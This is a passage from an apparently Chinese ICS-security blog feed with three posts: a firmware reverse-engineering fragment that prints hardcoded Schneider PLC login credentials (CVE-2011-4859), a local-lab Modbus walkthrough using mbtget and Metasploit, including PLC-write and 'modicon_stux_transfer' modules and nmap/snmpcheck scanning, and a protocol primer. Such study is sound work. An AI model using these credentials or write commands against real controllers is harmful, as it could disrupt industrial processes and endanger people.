中会先去表中找用户名，如果存在会报错，如果没有就会添加到表中。这里出现一个大问题就是用户名和密码都是明文存储，逆向得到的数据可以直接拿来登录：</p><pre><code class="cpp">void usrSecurity(void){  if ((sysFlags &amp; 0x20) == 0) {    loginInit();    shellLoginInstall(loginPrompt,0);    loginUserAdd(0,0);  }  return;}int loginUserAdd(undefined4 param_1,undefined4 param_2){  int iVar1;  uint uVar2;  undefined auStack24 [4];  byte local_14 [8];  iVar1 = symFindByName(DAT_0030c96c,param_1,auStack24,local_14);  if (iVar1 == 0) {    errnoSet(&amp;DAT_00360002);    iVar1 = -1;  }  else {    uVar2 = symAdd(DAT_0030c96c,param_1,param_2,(uint)local_14[0],(uint)symGroupDefault);    iVar1 = (int)(((int)uVar2 &gt;&gt; 0x1f) - ((int)uVar2 &gt;&gt; 0x1f ^ uVar2)) &gt;&gt; 0x1f;  }  return iVar1;}</code></pre><p>交叉引用一下，定位到多处调用。这个漏洞就是 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-4859" target="_blank" rel="noopener">CVE-2011-4859</a>（施耐德硬编码漏洞），攻击者可以获取到 FTP、TELNET 等协议的账号密码，并远程访问 PLC：</p><pre><code class="cpp">void usrAppInit(void){  ...  printf(s_-----&gt;_Password:_%s_&lt;-----_00205b30,auStack56);  loginDefaultEncrypt(auStack56,&amp;DAT_00342044);  loginUserAdd(s_fwupgrade_00205b4c,&amp;DAT_00342044);  loginUserAdd(s_sysdiag_00205b58,s_bbddRdzb9_00205b60);  loginUserAdd(s_fdrusers_00205b6c,s_bRbQyzcy9b_00205b78);  loginUserAdd(&amp;DAT_00205b84,s_cdcS9bcQc_00205b8c);  loginUserAdd(s_ntpupdate_00205b98,s_See9cb9y99_00205ba4);  ...}</code></pre><h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><h2 id="PowerPC-寄存器"><a href="#PowerPC-寄存器" class="headerlink" title="PowerPC 寄存器"></a>PowerPC 寄存器</h2><ul><li>r0：在 Function Prologs 时使用，一般不需要我们关心；</li><li>r1：栈寄存器；</li><li>r2：TOC 指针（Table of Contents），用于在系统调用时标识系统调用号；</li><li>r3：存储函数返回值；</li><li>r4-r10：参数，返回值较为特殊时（比如乘法导致一个寄存器放不下的时候），r4 也可以存放返回值；</li><li>r11：在指针的调用和当作一些语言的环境指针；</li><li>r12：在异常处理和 glink（动态连接器）代码；</li><li>r13：保留作为系统线程 ID；</li><li>r14-r31：存储本地变量。</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.anquanke.com/post/id/187792" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187792</a><br><a href="https://bbs.pediy.com/thread-229574.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-229574.htm</a><br><a href="https://www.anquanke.com/post/id/188591" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188591</a><br><a href="https://www.anquanke.com/post/id/189164" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189164</a><br><a href="https://www.anquanke.com/post/id/190565" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190565</a><br><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Experiments of Modbus Protocol</title>
    <link href="/2020/07/04/Experiments-of-Modbus-Protocol/"/>
    <url>/2020/07/04/Experiments-of-Modbus-Protocol/</url>
    
    <content type="html"><![CDATA[<p>使用工具模拟 Modbus 协议并抓包分析一些基础的功能码。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Kali Rolling (2019.4) x64</li><li>ModbusPal.jar</li><li>mbtget</li><li>Metasploit Framework</li></ul><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>启动 ModbusPal.jar，添加至少一个 Modbus Slave 作为模拟的 PLC：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/1.png" srcset="/img/loading.gif" alt></p><p>为新建的 Modbus Slave 分别添加 coils（比特）和 holding registers（16 位无符号整型），并设置一些值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/Experiments-of-Modbus-Protocol/3.png" srcset="/img/loading.gif" alt></p><p>下载并安装 mbtget 工具：</p><pre><code class="bash">$ git clone https://github.com/sourceperl/mbtget.git &amp; cd mbtget$ perl Makefile.PL$ make$ make install</code></pre><h1 id="Operate-with-Function-Code"><a href="#Operate-with-Function-Code" class="headerlink" title="Operate with Function Code"></a>Operate with Function Code</h1><p>使用 <code>mbtget -h</code> 查看命令行参数，其中只需要关注用于读写数据的几个参数：</p><pre><code class="bash">root@kali:~# mbtget -husage : mbtget [-hvdsf] [-2c]               [-u unit_id] [-a address] [-n number_value]               [-r[12347]] [-w5 bit_value] [-w6 word_value]               [-p port] [-t timeout] serveurcommand line :  -h                    : show this help message  -v                    : show version  -d                    : set dump mode (show tx/rx frame in hex)  -s                    : set script mode (csv on stdout)  -r1                   : read bit(s) (function 1)  -r2                   : read bit(s) (function 2)  -r3                   : read word(s) (function 3)  -r4                   : read word(s) (function 4)  -w5 bit_value         : write a bit (function 5)  -w6 word_value        : write a word (function 6)  -f                    : set floating point value  -2c                   : set &quot;two&#39;s complement&quot; mode for register read  -hex                  : show value in hex (default is decimal)  -u unit_id            : set the modbus &quot;unit id&quot;  -p port_number        : set TCP port (default 502)  -a modbus_address     : set modbus address (default 0)  -n value_number       : number of values to read  -t timeout            : set timeout seconds (default is 5s)</code></pre><p>首先对 coils 进行读取，<code>-a</code> 表示地址，<code>-n</code> 表示读取的数量：</p><pre><code class="bash">root@kali:~# mbtget -r1 -a 0 -n 10 127.0.0.1values:  1 (ad 00000):     1  2 (ad 00001):     1  3 (ad 00002):     1  4 (ad 00003):     1  5 (ad 00004):     0  6 (ad 00005):     0  7 (ad 00006):     0  8 (ad 00007):     0  9 (ad 00008):     0 10 (ad 00009):     0</code></pre><p>在 Wireshark 中抓包并筛选，前后分别为 TCP 三次握手和四次挥手。中间两条 Modbus 协议即为我们进行的操作，首先是发出进行读取的请求，Function Code 是 Read Coils，Bit Count 为 10，即读取 10 个比特：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/4.png" srcset="/img/loading.gif" alt></p><p>Response 中返回的数据即为前 10 个比特的值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/5.png" srcset="/img/loading.gif" alt></p><p>接下来对 holding registers 进行读取：</p><pre><code class="bash">root@kali:~# mbtget -r3 -a 0 -n 10 127.0.0.1values:  1 (ad 00000):     0  2 (ad 00001):     0  3 (ad 00002):     0  4 (ad 00003):     1  5 (ad 00004):     2  6 (ad 00005):     3  7 (ad 00006):     4  8 (ad 00007):     5  9 (ad 00008):     0 10 (ad 00009):     0</code></pre><p>和前面类似，Function Code 是 Read Holding Registers，Word Count 为 10，即读取 10 个字：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/6.png" srcset="/img/loading.gif" alt></p><p>Response 中返回前十个 holding registers 中的内容：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/7.png" srcset="/img/loading.gif" alt></p><p>然后对写 coil 操作进行设置：</p><pre><code class="bash">root@kali:~# mbtget -w5 1 -a 2 127.0.0.1bit write ok</code></pre><p>抓包看到的 Function Code 为 Write Single Coil，Reference Number 为 2（即第 3 个位置），Data 为 0：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/8.png" srcset="/img/loading.gif" alt></p><p>Response 包中返回修改后对应位置的值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/9.png" srcset="/img/loading.gif" alt></p><p>写 holding register 的操作类似：</p><pre><code class="bash">root@kali:~# mbtget -w6 233 -a 5 127.0.0.1word write ok</code></pre><p>抓包得到 Function Code 为 Write Single Register，Reference Number 为 5，Data 为 0xe9（233）：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/10.png" srcset="/img/loading.gif" alt></p><p>Response 返回修改后的结果：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/11.png" srcset="/img/loading.gif" alt></p><p>使用 MSF 同样可以进行类似的操作，如读寄存器内容：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modbusclientmsf5 auxiliary(scanner/scada/modbusclient) &gt; set ACTION READ_HOLDING_REGISTERSACTION =&gt; READ_HOLDING_REGISTERSmsf5 auxiliary(scanner/scada/modbusclient) &gt; set RHOST 127.0.0.1RHOST =&gt; 127.0.0.1msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA_ADDRESS 5DATA_ADDRESS =&gt; 5msf5 auxiliary(scanner/scada/modbusclient) &gt; run[*] Running module against 127.0.0.1[*] 127.0.0.1:502 - Sending READ HOLDING REGISTERS...[+] 127.0.0.1:502 - 1 register values from address 5 :[+] 127.0.0.1:502 - [3][*] Auxiliary module execution completed</code></pre><p>写寄存器内容：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modbusclientmsf5 auxiliary(scanner/scada/modbusclient) &gt; set ACTION WRITE_REGISTERACTION =&gt; WRITE_REGISTERmsf5 auxiliary(scanner/scada/modbusclient) &gt; set RHOST 127.0.0.1RHOST =&gt; 127.0.0.1msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA 123DATA =&gt; 123msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA_ADDRESS 6DATA_ADDRESS =&gt; 6msf5 auxiliary(scanner/scada/modbusclient) &gt; run[*] Running module against 127.0.0.1[*] 127.0.0.1:502 - Sending WRITE REGISTER...[+] 127.0.0.1:502 - Value 123 successfully written at registry address 6[*] Auxiliary module execution completed</code></pre><p>抓包的结果和 mbtget 相同。</p><h1 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h1><p>MSF 中还有一些模块可以用来执行 PLC 命令：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modicon_command...msf5 &gt; use auxiliary/admin/scada/modicon_stux_transfer_ASO</code></pre><p>使用 nmap 探测 PLC 开启的端口：</p><pre><code class="bash">nmap -n -T4 -p- -scan-delay=1 [TARGET]</code></pre><p>使用 snmpcheck 可以获取指定 PLC 的相关指纹信息：</p><pre><code class="bash">snmpcheck -t [TARGET]</code></pre><h1 id="Joke"><a href="#Joke" class="headerlink" title="Joke"></a>Joke</h1><p>工控安全很难做好是因为原本设备的使用期限就很长（十年甚至二十年以上），本身维护的开销又很大，一个漏洞的修复很难落实到每一点上。然而真正要做到安全，则需要从管理、设备、操作人员等多个方面协作才能实现。</p><p><img src="/pics/Experiments-of-Modbus-Protocol/12.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=iGwm6-lyn2Y" target="_blank" rel="noopener">https://www.youtube.com/watch?v=iGwm6-lyn2Y</a><br><a href="https://www.youtube.com/watch?v=rP_Jys1_OJk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=rP_Jys1_OJk</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工控安全基础概念初探</title>
    <link href="/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/"/>
    <url>/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>初探工控安全，主要分为协议安全、网络安全和固件安全等。</p><a id="more"></a><h1 id="Terminologies"><a href="#Terminologies" class="headerlink" title="Terminologies"></a>Terminologies</h1><ul><li>SCADA（Supervisory Control And Data Acquisition）：数据采集与监视控制系统</li><li>ICS（Industrial Control System）：工业控制系统</li><li>DCS（Distributed Control System）：分布式（集散）控制系统</li><li>PCS（Process Control System）：过程控制系统</li><li>ESD（Emergency Shutdown Device）：紧急停车系统</li><li>PLC（Programmable Logic Controller）：可编程序控制器<ul><li>工业场景需要控制许多的机械设备，而大部分机械设备需要用电路信号直接控制，比如许许多多的开关，对应到电上就是电路的通断。所以需要一些可以满足这种应用场景的专用计算机，并且还需要低时延，稳定性高，防震防潮等，即 PLC</li><li>使用一种叫”梯形图”的语言编写控制输入输出逻辑的程序（实现通过梯形图控制硬件 IO）</li></ul></li><li>RTU（Remote Terminal Unit）：远程终端控制系统</li><li>IED（Intelligent Electronic Device）：智能检测单元</li><li>HMI（Human Machine Interface）：人机界面</li><li>MIS（Management Information System）：管理信息系统</li><li>SIS（Supervisory Information System）：生产过程自动化监控和管理系统</li><li>MES（Manufacturing Execution System）：制造执行管理系统</li></ul><h1 id="ICS-Structure"><a href="#ICS-Structure" class="headerlink" title="ICS Structure"></a>ICS Structure</h1><p>工业控制系统结构：</p><ol><li>传感器和执行器；</li><li>可编程控制器（PLC）；</li><li>工业网络及现场总线；</li><li>工业计算机及工业组态软件。</li></ol><p><img src="/pics/工控安全基础概念初探/1.png" srcset="/img/loading.gif" alt></p><ul><li>过程自动化控制系统<ul><li>应用在流程行业，比如：石油、化工、医药、冶金、水处理等</li><li>对应的控制系统：DCS 居多，大型 PLC 为主，单台控制器 IO 点数多数在 2000 点以上，全冗余架构</li></ul></li><li>工厂自动化控制系统<ul><li>应用在离散行业，比如：汽车、港口、烟草等</li><li>对应的控制系统：主要以 PLC 为主，采用和设备捆绑为主，单台控制 IO 点数少于 2000 点，单机为主</li></ul></li></ul><h2 id="常见工业控制系统架构"><a href="#常见工业控制系统架构" class="headerlink" title="常见工业控制系统架构"></a>常见工业控制系统架构</h2><ol><li>Enterprise Zone：包括数据库、服务器等一些基础设备；</li><li>ICS DMZ：和一般网络架构中的 DMZ 类似，通常用于给外网提供服务，同时保护内网；</li><li>Process Control Zone：相当于内网的部分，通常外部对其的访问权限为只读；</li></ol><p>工业控制系统整体分层：</p><ol><li>Upper Layer（Engineering Workstation）：包括 HMI、SCADA 等设备。</li><li>Middle Layer：包括 PLC 等设备；</li><li>Lower Layer：包括传感器等设备。</li></ol><h2 id="工控产品厂商和产品介绍"><a href="#工控产品厂商和产品介绍" class="headerlink" title="工控产品厂商和产品介绍"></a>工控产品厂商和产品介绍</h2><ul><li>Siemens<ul><li>控制系统家族<ul><li>S7-1500 控制系统</li><li>S7-1200 控制系统</li><li>S7-300/400 控制系统</li><li>S7-WINAC 控制系统</li></ul></li><li>组态软件家族<ul><li>TIA 博图/Step7</li><li>WINCC 组态监控软件</li><li>PLCSIM 模拟仿真软件</li></ul></li><li>通讯协议及端口<ul><li>S7 Comm 协议（私有协议）</li><li>通讯端口 102</li></ul></li></ul></li><li>Rockwell Automation<ul><li>控制系统家族<ul><li>Controllogix 控制系统</li><li>Compactlogix 控制系统</li><li>MicroLogix 控制系统</li><li>Softlogix 控制系统</li></ul></li><li>组态软件家族<ul><li>Studio5000/RSLogix 5000 组态软件</li><li>FactoryTalk View SE 组态监控软件</li><li>Emulation 模拟仿真软件</li></ul></li><li>通讯协议及端口</li><li>Ethernet/IP（公开协议）</li><li>通讯端口 44818/2222</li></ul></li></ul><h1 id="Protocols"><a href="#Protocols" class="headerlink" title="Protocols"></a>Protocols</h1><p>安全问题：</p><ul><li>缺乏身份认证：仅需要使用一个合法的 Modbus 地址和合法的功能码即可以建立一个 Modbus 会话；</li><li>缺乏授权机制：没有基于角色的访问控制机制，任意用户可以执行任意的功能；</li><li>缺乏加密保护：地址和命令明文传输，可以很容易地捕获和解析。</li></ul><h2 id="Modbus"><a href="#Modbus" class="headerlink" title="Modbus"></a><a href="https://www.anquanke.com/post/id/185513" target="_blank" rel="noopener">Modbus</a></h2><p>Modbus 是一种应用层的报文传输协议，它既可以在物理层面上选择串口进行简单的串行通信，也可以使用 TCP 的方式进行传输。Modbus 协议定义了一个与基础通信层无关的简单协议数据单元（PDU）。特定总线或网络上的 Modbus 协议映射能够在应用数据单元（ADU）上引入一些附加域。</p><blockquote><p>因为 Modbus 是应用层的协议，所以其安全漏洞并不只是它本身，TCP/IP 的漏洞也可以利用在 Modbus 上。</p></blockquote><p><img src="/pics/工控安全基础概念初探/2.png" srcset="/img/loading.gif" alt></p><p>Modbus 对应的协议栈：</p><table><thead><tr><th style="text-align:center">Layer</th><th style="text-align:center">ISO/OSI Model</th><th style="text-align:center">Protocol</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">Application</td><td style="text-align:center">MODBUS Application Protocol</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Presentation</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Session</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Transport</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Network</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Data Link</td><td style="text-align:center">MODBUS Serial Line Protocol</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">Physical</td><td style="text-align:center">EIA/TIA-485 (or EIA/TIA-232)</td></tr></tbody></table><p><a href="https://youtu.be/iGwm6-lyn2Y?list=PLtGg6WbXti_8nwdf8ZsO_-n4Ik2cVnFJN&amp;t=2569" target="_blank" rel="noopener">Modbus 功能码（部分）</a>：</p><table><thead><tr><th style="text-align:center">Function code</th><th style="text-align:center">Function name</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Read coils</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Read holding registers</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Write single coil</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Write single register</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center">Write multiple registers</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">Read/Write multiple registers</td></tr></tbody></table><h2 id="PROFIBUS"><a href="#PROFIBUS" class="headerlink" title="PROFIBUS"></a>PROFIBUS</h2><p>一种用于工厂自动化车间级监控和现场设备层数据通信与控制的现场总线技术，可实现现场设备层到车间级监控的分散式数字控制和现场通信网络。</p><h2 id="DNP3"><a href="#DNP3" class="headerlink" title="DNP3"></a><a href="https://www.anquanke.com/post/id/187221" target="_blank" rel="noopener">DNP3</a></h2><ul><li>DNP（Distributed Network Protocol，分布式网络协议）是一种应用于自动化组件之间的通讯协议，常见于电力、水处理等行业；</li><li>简化 OSI 模型，完全基于 TCP/IP，只包含了物理层、数据层与应用层的体系结构（EPA），在应用层实现了对传输数据的分片、校验、控制等诸多功能；</li><li>DNP 借助 TCP 在以太网上运行，使用的端口是 20000 端口；</li><li>SCADA 可以使用 DNP 协议与主站、RTU、及 IED 进行通讯。</li></ul><h2 id="ICCP"><a href="#ICCP" class="headerlink" title="ICCP"></a>ICCP</h2><p>电力控制中心通讯协议。</p><h2 id="OPC"><a href="#OPC" class="headerlink" title="OPC"></a>OPC</h2><p>过程控制的 OLE（OLE for Process Control）。OPC 包括一整套接口、属性和方法的标准集，用于过程控制和制造业自动化系统。</p><h2 id="BACnet"><a href="#BACnet" class="headerlink" title="BACnet"></a>BACnet</h2><p>楼宇自动控制网络数据通讯协议（A Data Communication Protocol for Building Automation and Control Networks）。BACnet 协议是为计算机控制采暖、制冷、空调 HVAC 系统和其他建筑物设备系统定义服务和协议。</p><h2 id="CIP"><a href="#CIP" class="headerlink" title="CIP"></a>CIP</h2><p>通用工业协议，被 DeviceNet、ControlNet、EtherNet/IP 三种网络所采用。</p><h2 id="S7comm（Siemens-S7）"><a href="#S7comm（Siemens-S7）" class="headerlink" title="S7comm（Siemens S7）"></a><a href="https://www.anquanke.com/post/id/186099" target="_blank" rel="noopener">S7comm（Siemens S7）</a></h2><p>S7comm 全称 S7 Communication，是西门子专有协议，在西门子 S7-300/400 系列的 PLC 之间运行，用于 PLC 编程，PLC 之间的数据交换。S7 协议被封装在 TPKT 和 ISO-COTP 协议中。通过 TSAP，可加载 MPI、DP、以太网等不同物理结构总线或网络上，PLC 一般可以通过封装好的通讯功能快实现。</p><p>S7comm 对应的协议栈：</p><table><thead><tr><th style="text-align:center">Layer</th><th style="text-align:center">ISO/OSI Model</th><th style="text-align:center">Protocol</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">Application</td><td style="text-align:center">S7 communication</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Presentation</td><td style="text-align:center">S7 communication (COTP)</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Session</td><td style="text-align:center">S7 communication (TPKT)</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Transport</td><td style="text-align:center">ISO-on-TCP (RFC 1006)</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Network</td><td style="text-align:center">IP</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Data Link</td><td style="text-align:center">Ethernet</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">Physical</td><td style="text-align:center">Ethernet</td></tr></tbody></table><p><img src="/pics/工控安全基础概念初探/3.png" srcset="/img/loading.gif" alt></p><p>应用层 S7comm 协议结构体包含三部分：</p><ul><li>Header</li><li>Parameter</li><li>Data</li></ul><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Protocol Id</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">ROSCTR</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Redundancy Identification (Reserved)</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Protocol Data Unit Reference</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Parameter length</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Data length</td><td style="text-align:center">8</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Error class</td><td style="text-align:center">10</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Error code</td><td style="text-align:center">12</td><td style="text-align:center">2</td></tr></tbody></table><ul><li>Protocol Id：协议 ID，通常为 0x32；</li><li>ROSCTR：PDU 的类型；<ul><li>0x01（JOB）：作业请求，如读/写存储器，读/写块，启动/停止设备，设置通信；</li><li>0x02（ACK）：确认响应，是没有数据的简单确认；</li><li>0x03（ACK_DATA）：确认数据响应，一般是相应 JOB 的请求；</li><li>0x07（USERDATA）：扩展协议，其参数字段包括请求/相应 ID，一般用于编程/调试、读取 SZL 等。</li></ul></li><li>Redundancy Identification：冗余数据，通常为 0x0000；</li><li>Protocol Data Unit Reference：协议数据单元参考，通过请求时间增加；</li><li>Parameter length：参数的总长度；</li><li>Data length：数据长度，如果读取 PLC 内部数据则为 0x0000；而对于其他功能则为 Data 部分的数据长度；</li><li>Error class：错误类型；<ul><li>0x00（No error）：没有错误；</li><li>0x81（Application relationship）：应用关系；</li><li>0x82（Object definition）：对象定义；</li><li>0x83（No resources available）：没有可用资源；</li><li>0x84（Error on service processing）：服务处理种错误；</li><li>0x85（Error on supplies）：请求错误；</li><li>0x87（Access error）：访问错误。</li></ul></li><li><a href="#错误码的含义">Error code：错误码</a></li></ul><h3 id="Parameter-amp-Data"><a href="#Parameter-amp-Data" class="headerlink" title="Parameter &amp; Data"></a>Parameter &amp; Data</h3><p>S7comm 协议的 Parameter 部分与 Data 部分，则是根据 Header 中 PDU type 的功能码的不同、协议扩展（Userdata）的内容不同而变得不同。当 PDU 类型是 JOB 和 ACK_DATA 时，常见的功能码如下：</p><ul><li>0x00（CPU services）：CPU 服务</li><li>0xf0（Setup communication）：建立通信<ul><li>在每个会话开始时被发送，然后才可以交换任何其他消息，主要用于协商 ACK 队列的大小和最大 PDU 长度，双方声明它们的支持值（和计算机网络中的最大传送长度声明类似），ACK 队列的长度决定了可以同时启动而不需要确认的并行作业的数量。PDU 和队列长度字段都是大端。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Reserved（保留字节，一般为 0x00）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Max AmQ (parallel jobs with ack) calling</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Max AmQ (parallel jobs with ack) called</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">PDU length</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr></tbody></table><ul><li>0x04（Read Var）：读取值<ul><li>读数据操作，通过指定变量的存储区域，地址（偏移量）及其大小或类型来执行。</li></ul></li></ul><p>当 PDU 类型是 JOB 时，Parameter 部分的结构如下（没有 Data 部分）：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Item count</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center"><code>Item [n]</code></td><td style="text-align:center">2+12n</td><td style="text-align:center">12</td></tr></tbody></table><p>其中一个 Item 的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Variable specification（结构标识，通常为 0x12，代表变量规范）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length of following address specification（地址规范长度，主要是以此往后的地址长度）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Syntax-Id-取值">Syntax Id</a>（IDS 的地址规范的格式类型，用于确定寻址模式和其余项目结构的格式）</td><td style="text-align:center">2</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Transport-size-取值">Transport size</a>（数据传输大小，常见值如下表）</td><td style="text-align:center">3</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length（数据的长度）</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">DB number（DB 编号，如果访问的不是 DB 区域，此处为 0x0000）</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Area-取值">Area</a>（区域）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Address（地址）</td><td style="text-align:center">9</td><td style="text-align:center">3</td></tr></tbody></table><p>当 PDU 类型是 ACK_DATA 时，Parameter 部分的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Item count</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr></tbody></table><p>Data 部分存储 Item 结构体，其中一个 Item 的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center"><a href="#Item-结构中-Return-code-取值">Return code</a>（返回码）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Transport-size-取值">Transport size</a>（数据传输大小）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length（数据的长度）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Data</td><td style="text-align:center">4</td><td style="text-align:center">4 + Length of Data</td></tr><tr><td style="text-align:center">Fill byte（填充字节，如果数据的长度不满足 Length 的话，填充 0x00）</td><td style="text-align:center">/</td><td style="text-align:center">/</td></tr></tbody></table><ul><li>0x05（Write Var）：写入值<ul><li>写数据操作，通过指定变量的存储区域，地址（偏移量）及其大小或类型来执行。大部分和 Read Var 的结构相同，只是多了写的 Data 结构。</li></ul></li><li>0x1a（Request download）：请求下载</li></ul><p>当 PDU 类型是 JOB 时，结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（无意义，一般为 0x00000000）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">Filename Length（文件名长度）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Filename（文件名）</td><td style="text-align:center">9</td><td style="text-align:center">9</td></tr></tbody></table><p>其中文件名结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">File identifier（文件标识符，<code>_</code>——Complete Module、<code>$</code>——Module header for up-loading 两种）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#西门子设备中-8-种不同类型的功能块">Block type</a>（块类型，西门子设备中有 8 